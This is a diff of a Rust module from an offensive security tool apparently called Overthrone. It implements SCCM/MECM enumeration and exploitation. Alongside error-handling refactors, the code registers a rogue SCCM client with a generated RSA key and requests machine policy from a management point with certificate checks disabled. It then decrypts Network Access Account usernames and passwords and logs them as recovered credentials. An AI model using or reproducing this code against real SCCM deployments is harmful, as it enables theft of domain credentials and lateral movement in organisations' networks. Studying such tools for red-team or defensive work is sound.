@@ -2,7 +2,6 @@
 //!
 //! Provides capabilities for System Center Configuration Manager (SCCM / MECM)
 //! enumeration, discovery, and exploitation functionalities.
-
 use crate::error::{OverthroneError, Result};
 use base64::{Engine, engine::general_purpose::STANDARD as b64};
 use rsa::{
@@ -19,12 +18,14 @@ use serde::Deserialize;
 #[cfg(windows)]
 use wmi::{COMLibrary, WMIConnection};
 
-/// Configuration for SCCM Discovery
-pub struct SccmConfig {
+/// Configuration for SCCM Scanner operations
+pub struct SccmScannerConfig {
     pub target: String,
     pub domain: String,
     pub username: String,
+    pub password: Option<String>,
     pub pth_hash: Option<String>,
+    pub site_code: Option<String>,
 }
 
 /// Represents an SCCM Site Server / Management Point
@@ -45,12 +46,21 @@ pub struct NaaCredential {
 }
 
 pub struct SccmScanner {
-    config: SccmConfig,
+    config: SccmScannerConfig,
+    http_client: reqwest::Client,
 }
 
 impl SccmScanner {
-    pub fn new(config: SccmConfig) -> Self {
-        Self { config }
+    pub fn new(config: SccmScannerConfig) -> Result<Self> {
+        let http_client = reqwest::Client::builder()
+            .timeout(Duration::from_secs(10))
+            .danger_accept_invalid_certs(true)
+            .build()
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("HTTP client init: {}", e),
+            })?;
+        Ok(Self { config, http_client })
     }
 
     /// Primary discovery function combining HTTP and WMI (command generation for WMI)
@@ -115,13 +125,19 @@ impl SccmScanner {
             .timeout(Duration::from_secs(5))
             .danger_accept_invalid_certs(true)
             .build()
-            .map_err(|e| OverthroneError::Adcs(format!("Failed to build HTTP client: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("Failed to build HTTP client: {}", e),
+            })?;
 
         let response = client
             .get(&endpoint)
             .send()
             .await
-            .map_err(|e| OverthroneError::Adcs(format!("HTTP request failed: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("HTTP request failed: {}", e),
+            })?;
 
         if !response.status().is_success() {
             return Ok(None);
@@ -130,7 +146,10 @@ impl SccmScanner {
         let body = response
             .text()
             .await
-            .map_err(|e| OverthroneError::Adcs(format!("Failed to read response body: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("Failed to read response body: {}", e),
+            })?;
 
         // Basic XML extraction for <Property Name="SiteCode" Value="XXX"/>
         // without pulling in a heavy XML dependency for one field.
@@ -188,26 +207,35 @@ impl SccmScanner {
             .timeout(Duration::from_secs(10))
             .danger_accept_invalid_certs(true)
             .build()
-            .map_err(|e| OverthroneError::Adcs(format!("Failed to build HTTP client: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("Failed to build HTTP client: {}", e),
+            })?;
 
         // 1. Generate RSA Keypair
         info!("Generating 2048-bit RSA keypair for SCCM client registration...");
-        let mut rng = rand::thread_rng();
+        let mut rng = rsa::rand_core::OsRng;
         let priv_key = RsaPrivateKey::new(&mut rng, 2048)
-            .map_err(|e| OverthroneError::Adcs(format!("RSA generation failed: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("RSA generation failed: {}", e),
+            })?;
 
         let pub_key = priv_key.to_public_key();
         let spki_der = pub_key
             .to_public_key_der()
-            .map_err(|e| OverthroneError::Adcs(format!("SPKI DER encoding failed: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("SPKI DER encoding failed: {}", e),
+            })?;
 
         // Hash SPKI to create Client ID (SMSID)
         let mut hasher = Sha256::new();
         hasher.update(spki_der.as_bytes());
         let pub_hash = hasher.finalize();
-        let sms_id_guid = uuid::Builder::from_slice(&pub_hash[0..16])
-            .map(|b| b.into_uuid())
-            .unwrap_or_else(|_| uuid::Uuid::new_v4())
+        let mut uuid_bytes = [0u8; 16];
+        uuid_bytes.copy_from_slice(&pub_hash[0..16]);
+        let sms_id_guid = uuid::Uuid::from_bytes(uuid_bytes)
             .to_string()
             .to_uppercase();
 
@@ -251,7 +279,10 @@ impl SccmScanner {
         // Sign the digest using Pkcs1v15Sign
         let signature = priv_key
             .sign(rsa::pkcs1v15::Pkcs1v15Sign::new::<Sha256>(), &digest)
-            .map_err(|e| OverthroneError::Adcs(format!("RSA signing failed: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("RSA signing failed: {}", e),
+            })?;
         let b64_signature = b64.encode(signature);
 
         // Construct final signed body
@@ -262,11 +293,15 @@ impl SccmScanner {
 
         let response = client
             .post(&endpoint)
-            .header("Content-Type", "application/x-www-form-urlencoded")
+            .header("Content-Type", "text/xml; charset=utf-16")
+            .header("CCM-RequestType", "PolicyAssignment")
             .body(final_body)
             .send()
             .await
-            .map_err(|e| OverthroneError::Adcs(format!("Policy request failed: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("Policy request failed: {}", e),
+            })?;
 
         if !response.status().is_success() {
             warn!(
@@ -279,17 +314,20 @@ impl SccmScanner {
         let body = response
             .text()
             .await
-            .map_err(|e| OverthroneError::Adcs(format!("Failed to read policy response: {}", e)))?;
+            .map_err(|e| OverthroneError::Protocol {
+                protocol: "SCCM".to_string(),
+                reason: format!("Failed to read policy response: {}", e),
+            })?;
 
         info!("Successfully retrieved Machine Policy data from Management Point.");
 
         // At this stage, the policy XML contains Base64 encoded, RSA encrypted blocks with
         // the Network Access Accounts inside `<NetworkAccessAccount>`.
-        // Decryption requires the private key corresponding to the public key we would have attached.
+        // Decryption requires the private key corresponding to the public key we attached.
 
         // Extract the blobs (stubbed parser)
         // Look for NetworkAccessUsername and NetworkAccessPassword inside the policy XML
-        let mut naas = Vec::new();
+        let mut naas: Vec<NaaCredential> = Vec::new();
 
         let user_tag_start = "<NetworkAccessUsername><![CDATA[";
         let pass_tag_start = "<NetworkAccessPassword><![CDATA[";
@@ -311,44 +349,50 @@ impl SccmScanner {
                         let p_end = p_start + p_end_offset;
                         let encrypted_pass_b64 = &body[p_start..p_end];
 
-                        // We found a pair, let's decrypt them using RSA PKCS1v1.5
-                        if let (Ok(u_bytes), Ok(p_bytes)) = (
-                            b64.decode(encrypted_user_b64),
-                            b64.decode(encrypted_pass_b64),
-                        )
-                            && let Ok(dec_user_bytes) =
-                                priv_key.decrypt(rsa::pkcs1v15::Pkcs1v15Encrypt, &u_bytes)
-                                && let Ok(dec_pass_bytes) =
-                                    priv_key.decrypt(rsa::pkcs1v15::Pkcs1v15Encrypt, &p_bytes)
-                                {
-                                    // SCCM encodes these as UTF-16LE, so we need to decode them
-                                    // Simple byte expansion removal for ASCII/Basic Latin
-                                    let username = String::from_utf16_lossy(
-                                        &dec_user_bytes
-                                            .chunks_exact(2)
-                                            .map(|c| u16::from_le_bytes([c[0], c[1]]))
-                                            .collect::<Vec<u16>>(),
-                                    );
-                                    let password = String::from_utf16_lossy(
-                                        &dec_pass_bytes
-                                            .chunks_exact(2)
-                                            .map(|c| u16::from_le_bytes([c[0], c[1]]))
-                                            .collect::<Vec<u16>>(),
-                                    );
+                        // Decode both Base64 blobs
+                        let u_decode = b64.decode(encrypted_user_b64);
+                        let p_decode = b64.decode(encrypted_pass_b64);
 
-                                    info!(
-                                        "🔑 Successfully decrypted Network Access Account: {}\\{}",
-                                        self.config.domain, username
-                                    );
-                                    naas.push(NaaCredential {
-                                        username,
-                                        domain: self.config.domain.clone(),
-                                        password_blob: password, // Store plaintext here now
-                                    });
-                                }
+                        if let (Ok(u_bytes), Ok(p_bytes)) = (u_decode, p_decode) {
+                            // Decrypt with RSA PKCS1v1.5
+                            let dec_user = priv_key.decrypt(Pkcs1v15Encrypt, &u_bytes);
+                            let dec_pass = priv_key.decrypt(Pkcs1v15Encrypt, &p_bytes);
+
+                            if let (Ok(dec_user_bytes), Ok(dec_pass_bytes)) =
+                                (dec_user, dec_pass)
+                            {
+                                // SCCM encodes these as UTF-16LE
+                                let username = String::from_utf16_lossy(
+                                    &dec_user_bytes
+                                        .chunks_exact(2)
+                                        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                                        .collect::<Vec<u16>>(),
+                                );
+                                let password = String::from_utf16_lossy(
+                                    &dec_pass_bytes
+                                        .chunks_exact(2)
+                                        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                                        .collect::<Vec<u16>>(),
+                                );
+
+                                info!(
+                                    "🔑 Decrypted Network Access Account: {}\\{}",
+                                    self.config.domain, username
+                                );
+                                naas.push(NaaCredential {
+                                    username,
+                                    domain: self.config.domain.clone(),
+                                    password_blob: password,
+                                });
+                            }
+                        }
 
                         current_idx = p_end;
+                    } else {
+                        current_idx += 1;
                     }
+                } else {
+                    current_idx += 1;
                 }
             } else {
                 break;
@@ -399,12 +443,18 @@ impl SccmScanner {
         // WMI is a blocking COM operational path. Must run inside spawn_blocking.
         let result = tokio::task::spawn_blocking(move || -> Result<Vec<SccmSite>> {
             let com_con = COMLibrary::new()
-                .map_err(|e| OverthroneError::Adcs(format!("COM init failed: {}", e)))?;
+                .map_err(|e| OverthroneError::Protocol {
+                    protocol: "SCCM".to_string(),
+                    reason: format!("COM init failed: {}", e),
+                })?;
 
             // Connect to root\sms
             let namespace = format!(r#"\\{}\root\sms"#, target);
             let wmi_con = WMIConnection::with_namespace_path(&namespace, com_con)
-                .map_err(|e| OverthroneError::Adcs(format!("WMI connect failed: {}", e)))?;
+                .map_err(|e| OverthroneError::Protocol {
+                    protocol: "SCCM".to_string(),
+                    reason: format!("WMI connect failed: {}", e),
+                })?;
 
             #[derive(Deserialize, Debug)]
             #[serde(rename_all = "PascalCase")]
@@ -416,14 +466,17 @@ impl SccmScanner {
             // Query SMS_ProviderLocation
             let results: Vec<ProviderLocation> = wmi_con
                 .raw_query("SELECT SiteCode, Machine FROM SMS_ProviderLocation")
-                .map_err(|e| OverthroneError::Adcs(format!("WMI query failed: {}", e)))?;
+                .map_err(|e| OverthroneError::Protocol {
+                    protocol: "SCCM".to_string(),
+                    reason: format!("WMI query failed: {}", e),
+                })?;
 
             let mut sites = Vec::new();
             for prov in results {
                 sites.push(SccmSite {
                     site_code: prov.site_code.clone(),
                     site_server: prov.machine.clone(),
-                    version: "Unknown (via ProviderLocation)".to_string(), // We'd need SMS_Site for version
+                    version: "Unknown (via ProviderLocation)".to_string(),
                     is_management_point: false,
                 });
             }
@@ -431,7 +484,10 @@ impl SccmScanner {
             Ok(sites)
         })
         .await
-        .map_err(|e| OverthroneError::Adcs(format!("WMI thread panicked: {}", e)))??;
+        .map_err(|e| OverthroneError::Protocol {
+            protocol: "SCCM".to_string(),
+            reason: format!("WMI thread panicked: {}", e),
+        })??;
 
         Ok(result)
     }
